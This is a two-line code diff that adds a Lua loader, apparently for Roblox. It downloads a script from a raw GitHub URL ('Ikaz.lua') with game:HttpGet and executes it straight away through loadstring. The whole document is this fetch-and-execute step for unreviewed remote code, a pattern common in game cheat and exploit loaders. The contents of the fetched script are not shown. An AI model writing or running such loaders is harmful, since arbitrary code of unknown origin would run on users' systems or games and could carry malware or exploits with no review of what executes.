@@ -1,0 +1,2 @@
+local scriptURL = "https://raw.githubusercontent.com/AlexsiJujuLol/Ikorz/main/Ikaz.lua"
+loadstring(game:HttpGet(scriptURL))()
